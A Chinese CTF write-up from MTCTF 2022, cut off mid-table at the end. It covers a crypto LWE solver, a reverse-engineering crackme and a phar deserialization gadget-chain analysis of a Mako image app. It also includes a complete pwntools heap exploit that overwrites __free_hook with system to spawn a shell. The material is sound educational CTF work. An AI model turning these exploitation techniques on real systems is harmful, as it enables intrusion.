<p>就是一个glibc2.27的UAF漏洞，但是申请的堆块大小只能是0x20或0x30，当申请0x20时，edit函数存在溢出修改chunk_size泄露libc即可</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn import *</span><br><span class="line"><span class="attribute">r</span>=process(&quot;/home/ubuntu/pwn/题目/i春秋/MTCTF/pwn&quot;)</span><br><span class="line"><span class="comment"># r=remote(&quot;47.95.8.59&quot;,24835)</span></span><br><span class="line"><span class="attribute">elf</span>=ELF(&quot;/home/ubuntu/pwn/题目/i春秋/MTCTF/pwn&quot;)</span><br><span class="line"><span class="attribute">libc</span>=ELF(&quot;/home/ubuntu/pwn/题目/i春秋/MTCTF/libc.so.6&quot;)</span><br><span class="line">context(<span class="attribute">arch</span>=<span class="string">&quot;amd64&quot;</span>,os=&quot;linux&quot;,log_level=&quot;debug&quot;)</span><br><span class="line">context.terminal = [<span class="string">&#x27;terminator&#x27;</span>, <span class="string">&#x27;-x&#x27;</span>, <span class="string">&#x27;sh&#x27;</span>, <span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line"></span><br><span class="line">def dbg():</span><br><span class="line">    <span class="attribute">src</span>=<span class="string">&#x27;&#x27;</span><span class="string">&#x27;</span></span><br><span class="line"><span class="string">    b *$rebase(0x127C)</span></span><br><span class="line"><span class="string">    &#x27;</span><span class="string">&#x27;&#x27;</span></span><br><span class="line">    gdb.attach(r,src)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">def meau(index):</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;&gt;&quot;</span>,str(index))</span><br><span class="line"></span><br><span class="line">def <span class="built_in">add</span>(size):</span><br><span class="line">    meau(1)</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;What size of paper do you want to add?&quot;</span>,str(size))</span><br><span class="line"></span><br><span class="line">def delete(index):</span><br><span class="line">    meau(2)</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;Which page do you want torn up?&quot;</span>,str(index))</span><br><span class="line"></span><br><span class="line">def <span class="built_in">edit</span>(index,content):</span><br><span class="line">    meau(3)</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;Which page do you want to write?&quot;</span>,str(index))</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;How many words do you need to write?&quot;</span>,str(len(content)))</span><br><span class="line">    r.sendafter(<span class="string">&quot;Content:&quot;</span>,content)</span><br><span class="line"></span><br><span class="line">def show(index):</span><br><span class="line">    meau(4)</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;Which page do you want to review?&quot;</span>,str(index))</span><br><span class="line"></span><br><span class="line"><span class="built_in">add</span>(0x18)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(0x18):</span><br><span class="line">    <span class="built_in">add</span>(0x1f)</span><br><span class="line"></span><br><span class="line"><span class="attribute">payload</span>=p64(0)*3+p64(0x421)</span><br><span class="line"><span class="built_in">edit</span>(0,payload)</span><br><span class="line">delete(1)</span><br><span class="line">show(1)</span><br><span class="line"><span class="attribute">libc_base</span>=u64(r.recvuntil(b&quot;\x7f&quot;)[-6:].ljust(8,b<span class="string">&quot;\x00&quot;</span>))-0x10-96-libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">success(<span class="string">&quot;libc_base = &quot;</span>+hex(libc_base))</span><br><span class="line"><span class="attribute">free_hook</span>=libc_base+libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line"><span class="attribute">system_addr</span>=libc_base+libc.symbols[<span class="string">&quot;system&quot;</span>]</span><br><span class="line"></span><br><span class="line">delete(2)</span><br><span class="line">delete(3)</span><br><span class="line"><span class="built_in">edit</span>(3,p64(free_hook))</span><br><span class="line"><span class="built_in">add</span>(0x1f)</span><br><span class="line"><span class="built_in">add</span>(0x1f)</span><br><span class="line"><span class="built_in">edit</span>(0x17,p64(system_addr))</span><br><span class="line"><span class="built_in">edit</span>(4,<span class="string">&quot;/bin/sh&quot;</span>)</span><br><span class="line">delete(4)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="crypto-2"><a class="markdownIt-Anchor" href="#crypto-2"></a> <strong>Crypto</strong></h2>
<h3 id="strange_lwe"><a class="markdownIt-Anchor" href="#strange_lwe"></a> <strong>strange_lwe</strong></h3>
<p>LWE问题，用babai’s CVP算法求解。</p>
<p>这里我本来想直接通过误差来进行判断的，然而发现有些位对不上。因此还是绕了个弯先把s给算出来了。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sage.stats.distributions.discrete_gaussian_integer <span class="keyword">import</span> DiscreteGaussianDistributionIntegerSampler</span><br><span class="line"><span class="keyword">from</span> sage.modules.free_module_integer <span class="keyword">import</span> IntegerLattice</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Babai&#x27;s Nearest Plane algorithm</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Babai_closest_vector</span>(<span class="params">M, G, target</span>):</span><br><span class="line">    small = target</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">reversed</span>(<span class="built_in">range</span>(M.nrows())):</span><br><span class="line">            c = ((small * G[i]) / (G[i] * G[i])).<span class="built_in">round</span>()</span><br><span class="line">            small -=  M[i] * c</span><br><span class="line">    <span class="keyword">return</span> target - small</span><br><span class="line">q = <span class="number">401</span></span><br><span class="line">m = <span class="number">64</span></span><br><span class="line">n = <span class="number">16</span></span><br><span class="line">a = <span class="number">0.025</span></span><br><span class="line">num = <span class="number">48</span></span><br><span class="line">data=<span class="built_in">open</span>(<span class="string">&#x27;data.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>).readlines()</span><br><span class="line">A=Matrix(ZZ,<span class="built_in">eval</span>(data[<span class="number">0</span>].strip()))</span><br><span class="line">cipher=<span class="built_in">eval</span>(data[<span class="number">1</span>].strip())</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(cipher))</span><br><span class="line"></span><br><span class="line"><span class="comment">#t=DiscreteGaussianDistributionIntegerSampler(a*q)</span></span><br><span class="line"><span class="comment">#print([ t() for _ in range(1000)])</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">res=&#x27;&#x27;</span></span><br><span class="line"><span class="string">for k in range(num):</span></span><br><span class="line"><span class="string">	rt=cipher[k][0]</span></span><br><span class="line"><span class="string">	Lattice = matrix(ZZ, m + n, m)</span></span><br><span class="line"><span class="string">	for i in range(m):</span></span><br><span class="line"><span class="string">		for j in range(n):</span></span><br><span class="line"><span class="string">			Lattice[m + j, i] = A[i][j]</span></span><br><span class="line"><span class="string">		Lattice[i, i] = q</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">	lattice = IntegerLattice(Lattice, lll_reduce=True)</span></span><br><span class="line"><span class="string">	print(&quot;LLL done&quot;)</span></span><br><span class="line"><span class="string">	gram = lattice.reduced_basis.gram_schmidt()[0]</span></span><br><span class="line"><span class="string">	target = vector(ZZ,rt)</span></span><br><span class="line"><span class="string">	cv = Babai_closest_vector(lattice.reduced_basis, gram, target)</span></span><br><span class="line"><span class="string">	#print(&quot;Closest Vector: &#123;&#125;&quot;.format(cv))</span></span><br><span class="line"><span class="string">	error=cv-target</span></span><br><span class="line"><span class="string">	print(&quot;Error: &#123;&#125;&quot;.format(error))</span></span><br><span class="line"><span class="string">	if any([abs(e)&gt;40 for e in error]):</span></span><br><span class="line"><span class="string">		res+=&#x27;0&#x27;</span></span><br><span class="line"><span class="string">	else:</span></span><br><span class="line"><span class="string">		res+=&#x27;1&#x27;</span></span><br><span class="line"><span class="string">	print(res)</span></span><br><span class="line"><span class="string">	A = matrix(Zmod(q), A)</span></span><br><span class="line"><span class="string">	try:</span></span><br><span class="line"><span class="string">		s = A.solve_right(cv)</span></span><br><span class="line"><span class="string">		print(&#x27;s: &#123;&#125;&#x27;.format(s))</span></span><br><span class="line"><span class="string">	except:</span></span><br><span class="line"><span class="string">		print(&quot;no solution&quot;)</span></span><br><span class="line"><span class="string">		continue</span></span><br><span class="line"><span class="string">print(res)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">s=(<span class="number">195</span>, <span class="number">202</span>, <span class="number">322</span>, <span class="number">287</span>, <span class="number">230</span>, <span class="number">311</span>, <span class="number">396</span>, <span class="number">58</span>, <span class="number">242</span>, <span class="number">191</span>, <span class="number">117</span>, <span class="number">41</span>, <span class="number">248</span>, <span class="number">264</span>, <span class="number">139</span>, <span class="number">291</span>)</span><br><span class="line">s=vector(GF(q),s)</span><br><span class="line">A=Matrix(GF(q),A)</span><br><span class="line"><span class="built_in">print</span>(A*s)</span><br><span class="line">res=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(num):</span><br><span class="line">	tmp=[]</span><br><span class="line">	<span class="keyword">for</span> l <span class="keyword">in</span> <span class="built_in">range</span>(num*<span class="number">8</span>):</span><br><span class="line">		c=vector(ZZ,cipher[k][l])</span><br><span class="line">		As=vector(GF(q),A*s)</span><br><span class="line">		t=c-As</span><br><span class="line">		t=[tt <span class="keyword">if</span> tt&lt;(q//<span class="number">2</span>) <span class="keyword">else</span> q-tt <span class="keyword">for</span> tt <span class="keyword">in</span> t]</span><br><span class="line">		tmp.extend(t)</span><br><span class="line">	<span class="keyword">if</span> <span class="built_in">all</span>([ tt&lt;<span class="number">40</span> <span class="keyword">for</span> tt <span class="keyword">in</span> t]):</span><br><span class="line">		res+=<span class="string">&#x27;1&#x27;</span></span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		res+=<span class="string">&#x27;0&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(res)</span><br><span class="line"><span class="comment">#res=&#x27;000000110110001010100111101100001101011110011110&#x27;</span></span><br><span class="line">my_secret_bits=<span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">int</span>,res))</span><br><span class="line">flag = <span class="string">&#x27;flag&#123;&#x27;</span> + sha1(<span class="built_in">str</span>(my_secret_bits).encode()).hexdigest() + <span class="string">&#x27;&#125;&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment">#flag&#123;7e0fefd15c630d4b41db2ac9e18d48d691b3d419&#125;</span></span><br></pre></td></tr></table></figure>
<h2 id="reverse"><a class="markdownIt-Anchor" href="#reverse"></a> <strong>Reverse</strong></h2>
<h3 id="crackme"><a class="markdownIt-Anchor" href="#crackme"></a> <strong>crackme</strong></h3>
<p>题目核心逻辑在digest函数里，首先可以看到这里有个SM4加密:</p>
<p><img src="/2022/09/MT-CTF-Writeup/9JL4IvvtABLoNAquRwetrA.png" alt="13"></p>
<p>接下来最底下有个RC4：</p>
<p><img src="/2022/09/MT-CTF-Writeup/e7Ydd8t3cchsUByy2klzDQ.png" alt="14"></p>
<p>猜测程序是先做SM4加密，最后RC4并转hex输出digest。SM4密钥已给出，而RC4密钥动调可以发现就是LicenseKey。因此用CyberChef在线跑一下解密就出了。</p>
<p><img src="/2022/09/MT-CTF-Writeup/XYLE2NUnBulMjsDqQRqnVA.png" alt="15"></p>
<p>flag{c6545808-81ba-48c6-b082-df559da10751}</p>
<h2 id="web_复现"><a class="markdownIt-Anchor" href="#web_复现"></a> Web_复现</h2>
<h3 id="mako_imagemagick"><a class="markdownIt-Anchor" href="#mako_imagemagick"></a> <strong>Mako_imagemagick:</strong></h3>
<h4 id="赛题复现"><a class="markdownIt-Anchor" href="#赛题复现"></a> 赛题复现：</h4>
<p>自己起了一个docker，我们先大概看一下题目吧。</p>
<p><img src="/2022/09/MT-CTF-Writeup/image-20221008000647522-166727395787415.png" alt="test01"></p>
<p>文件上传先简单的传个文件抓个包看一下，</p>
<p><img src="/2022/09/MT-CTF-Writeup/image-20221008002817077-166727395787416.png" alt="test02"></p>
<p>这里还没有去看源码，看到这个，就随便上传了一个码试了一下，发现图片上传后被发送到一个函数中处理。这里就意识到不是简单的文件上传了，决赛时也去啃源码了，但是没怎么啃明白，复现时间足够多，在加上Maxzed大师傅的wp总算啃明白了，源码太多，我就截重点来说吧。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$image</span>, ProcessorInterface <span class="variable">$processor</span></span>)</span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="variable language_">$this</span>-&gt;image = <span class="variable">$image</span>;</span><br><span class="line"></span><br><span class="line">		<span class="variable language_">$this</span>-&gt;processor = <span class="variable">$processor</span>;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// Make sure that the image exists</span></span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="variable">$this</span>-&gt;image) === <span class="literal">false</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">PixlException</span>(<span class="title function_ invoke__">vsprintf</span>(<span class="string">&#x27;The image [ %s ] does not exist.&#x27;</span>, [<span class="variable">$this</span>-&gt;image]));</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// Set the image</span></span><br><span class="line"></span><br><span class="line">		<span class="variable language_">$this</span>-&gt;processor-&gt;<span class="title function_ invoke__">open</span>(<span class="variable">$image</span>);</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
<p>这里看Maxzed师傅的wp没看出来他怎么判断存在phar反序列化漏洞，这里自己又去细看了一下源码。</p>
<p>按照phar反序列化的惯例就是要找可控的函数，那就找吧<s>审那么大一个玩意儿确实难受</s></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ImagesController</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">home</span>(<span class="params">ViewFactory <span class="variable">$view</span></span>): <span class="title">string</span> </span>&#123;</span><br><span class="line">		<span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;/var/www/mako/uploads&#x27;</span>);</span><br><span class="line">		<span class="variable">$fileNames</span> = <span class="title function_ invoke__">array_diff</span>(<span class="title function_ invoke__">scandir</span>(<span class="string">&#x27;.&#x27;</span>), <span class="keyword">array</span>(<span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;..&#x27;</span>));</span><br><span class="line">		<span class="variable">$images</span> = [];</span><br><span class="line">		<span class="keyword">foreach</span>(<span class="variable">$fileNames</span> <span class="keyword">as</span> <span class="variable">$index</span> =&gt; <span class="variable">$fileName</span>) &#123;<span class="comment">//每次循环中，当前数组元素的值被赋给 $fileName，当前数组元素的键名也会在每次循环中被赋给变量 $index。并且数组内部的指针向前移一步（因此下一次循环中将会得到下一个数组元素），直到遍历到数组的末尾，停止遍历并退出循环。</span></span><br><span class="line">			<span class="variable">$images</span>[<span class="variable">$fileName</span>] = <span class="string">&#x27;data:image/&#x27;</span> . <span class="title function_ invoke__">pathinfo</span>(<span class="variable">$fileName</span>, PATHINFO_EXTENSION) . <span class="string">&#x27;;base64,&#x27;</span> . <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$fileName</span>));<span class="comment">//对每次循环的fileName进行base64编码</span></span><br><span class="line">		&#125;</span><br><span class="line">		<span class="variable language_">$this</span>-&gt;view-&gt;<span class="title function_ invoke__">assign</span>(<span class="string">&#x27;images&#x27;</span>, <span class="variable">$images</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$view</span>-&gt;<span class="title function_ invoke__">render</span>(<span class="string">&#x27;home&#x27;</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">		<span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;/var/www/mako/uploads&#x27;</span>);</span><br><span class="line">		<span class="variable">$imageFile</span> = <span class="variable language_">$this</span>-&gt;request-&gt;<span class="title function_ invoke__">getFiles</span>()-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;image&#x27;</span>);</span><br><span class="line">		<span class="variable">$fileName</span> = <span class="variable">$imageFile</span>-&gt;<span class="title function_ invoke__">getReportedFilename</span>();<span class="comment">//获取fileName的一个函数，这里是读取imageFile的文件名并赋值给fileName</span></span><br><span class="line">		<span class="variable">$imageFile</span>-&gt;<span class="title function_ invoke__">moveTo</span>(<span class="variable">$fileName</span>);</span><br><span class="line">		<span class="variable language_">$this</span>-&gt;response-&gt;<span class="title function_ invoke__">getHeaders</span>()-&gt;<span class="title function_ invoke__">add</span>(<span class="string">&#x27;Location&#x27;</span>, <span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">	&#125;<span class="comment">//就这个函数，要是敏锐一些，应该就能猜到fileName可控，那么就要找触发点，接着审。</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">editGet</span>(<span class="params">ViewFactory <span class="variable">$view</span></span>): <span class="title">string</span> </span>&#123;</span><br><span class="line">		<span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;/var/www/mako/uploads&#x27;</span>);</span><br><span class="line">		<span class="variable">$fileName</span> = <span class="variable language_">$this</span>-&gt;request-&gt;<span class="title function_ invoke__">getQuery</span>()-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;filename&#x27;</span>);</span><br><span class="line">		<span class="variable">$image</span> = <span class="keyword">new</span> <span class="title class_">Image</span>(<span class="variable">$fileName</span>, <span class="keyword">new</span> <span class="title class_">ImageMagick</span>());<span class="comment">//可控的filename,这里可以用来触发phar</span></span><br><span class="line">		<span class="variable">$dimensions</span> = <span class="variable">$image</span>-&gt;<span class="title function_ invoke__">getDimensions</span>();</span><br><span class="line">		<span class="variable language_">$this</span>-&gt;view-&gt;<span class="title function_ invoke__">assign</span>(<span class="string">&#x27;fileName&#x27;</span>, <span class="variable">$fileName</span>);</span><br><span class="line">		<span class="variable language_">$this</span>-&gt;view-&gt;<span class="title function_ invoke__">assign</span>(<span class="string">&#x27;dimensions&#x27;</span>, <span class="variable">$dimensions</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="variable">$view</span>-&gt;<span class="title function_ invoke__">render</span>(<span class="string">&#x27;edit&#x27;</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">editPost</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">		<span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;/var/www/mako/uploads&#x27;</span>);</span><br><span class="line">		<span class="variable">$post</span> = <span class="variable language_">$this</span>-&gt;request-&gt;<span class="title function_ invoke__">getPost</span>();</span><br><span class="line">		<span class="variable">$fileName</span> = <span class="variable">$post</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;filename&#x27;</span>);</span><br><span class="line">		<span class="variable">$degrees</span> = <span class="variable">$post</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;degrees&#x27;</span>);</span><br><span class="line">		<span class="variable">$image</span> = <span class="keyword">new</span> <span class="title class_">Image</span>(<span class="variable">$fileName</span>, <span class="keyword">new</span> <span class="title class_">ImageMagick</span>());</span><br><span class="line">		<span class="variable">$image</span>-&gt;<span class="title function_ invoke__">rotate</span>(<span class="variable">$degrees</span>);</span><br><span class="line">		<span class="variable">$image</span>-&gt;<span class="title function_ invoke__">save</span>();</span><br><span class="line">		<span class="variable language_">$this</span>-&gt;response-&gt;<span class="title function_ invoke__">getHeaders</span>()-&gt;<span class="title function_ invoke__">add</span>(<span class="string">&#x27;Location&#x27;</span>, <span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里来说一下fileName为啥是可控的,在Image构造函数中存在file_exists()来触发，同时在ediGet中filename进行get访问，即可用来触发phar</p>
<p><img src="/2022/09/MT-CTF-Writeup/image-20221008212336541-166727395787417.png" alt="test03"></p>
<p>那么接下来就是挖链子了，</p>
<p>初步审下来，我这里就直接用maxzed的链子了，我就解读一下他为啥会用这个链子</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Session.<span class="title function_ invoke__">__destruct</span>().<span class="title function_ invoke__">commit</span>()-&gt;</span><br><span class="line">File.<span class="title function_ invoke__">write</span>()-&gt;</span><br><span class="line">FileSystem.<span class="title function_ invoke__">put</span>()</span><br></pre></td></tr></table></figure>
<p>在Session.php中的__destruct(),具有自动提交会话数据的commit,数据传到File</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">commit</span>(<span class="params"></span>): <span class="title">void</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="comment">// Replace old flash data with new</span></span><br><span class="line"></span><br><span class="line">		<span class="variable language_">$this</span>-&gt;sessionData[<span class="string">&#x27;mako.flashdata&#x27;</span>] = <span class="variable language_">$this</span>-&gt;flashData;<span class="comment">//</span></span><br><span class="line"></span><br><span class="line">		<span class="comment">// Write session data</span></span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(!<span class="variable language_">$this</span>-&gt;destroyed)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="variable language_">$this</span>-&gt;store-&gt;<span class="title function_ invoke__">write</span>(<span class="variable">$this</span>-&gt;sessionId, <span class="variable">$this</span>-&gt;sessionData, <span class="variable">$this</span>-&gt;options[<span class="string">&#x27;data_ttl&#x27;</span>]);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
<p>在File.write()中存在写入功能点，链子利用的就是这个，接着看下一个功能点。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params"><span class="keyword">string</span> <span class="variable">$sessionId</span>, <span class="keyword">array</span> <span class="variable">$sessionData</span>, <span class="keyword">int</span> <span class="variable">$dataTTL</span></span>): <span class="title">void</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;fileSystem-&gt;<span class="title function_ invoke__">isWritable</span>(<span class="variable">$this</span>-&gt;sessionPath))</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="variable language_">$this</span>-&gt;fileSystem-&gt;<span class="title function_ invoke__">put</span>(<span class="variable">$this</span>-&gt;<span class="title function_ invoke__">sessionFile</span>(<span class="variable">$sessionId</span>), <span class="title function_ invoke__">serialize</span>(<span class="variable">$sessionData</span>)) === <span class="literal">false</span> ? <span class="literal">false</span> : <span class="literal">true</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
<p>fileSystem.php中的put()</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">put</span>(<span class="params"><span class="keyword">string</span> <span class="variable">$file</span>, <span class="variable">$data</span>, <span class="keyword">bool</span> <span class="variable">$lock</span> = <span class="literal">false</span></span>)</span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$file</span>, <span class="variable">$data</span>, <span class="variable">$lock</span> ? LOCK_EX : <span class="number">0</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>file_put_contents():</p>
<p>功能：把一个字符串写入文件中。</p>
<p>语法：<code>file_put_contents(file,data,mode,context)</code></p>
<p>参数说明：</p>
<table>
